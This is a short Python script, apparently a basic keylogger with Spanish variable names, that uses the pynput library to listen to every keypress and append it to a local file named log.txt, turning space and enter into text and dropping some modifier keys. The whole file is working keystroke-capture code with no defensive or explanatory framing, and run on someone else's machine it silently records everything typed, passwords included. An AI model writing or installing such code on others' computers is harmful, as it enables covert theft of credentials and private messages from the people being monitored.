#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pynput.keyboard import Listener
#import sys


def capt(key):
    tecla = str(key)
    #tecla = tecla.replace("'", "")

    if tecla == 'Key.space':
        tecla = ' '
    if tecla == 'Key.shift_r':
        tecla = ''
    if tecla == "Key.ctrl_l":
        tecla = ""
    if tecla == "Key.enter":
        tecla = "\n"
    #if tecla == "Key.esc":
        #sys.exit()

    with open("log.txt", 'a') as f:
        f.write(tecla)

with Listener(on_press=capt) as c:
    c.join()
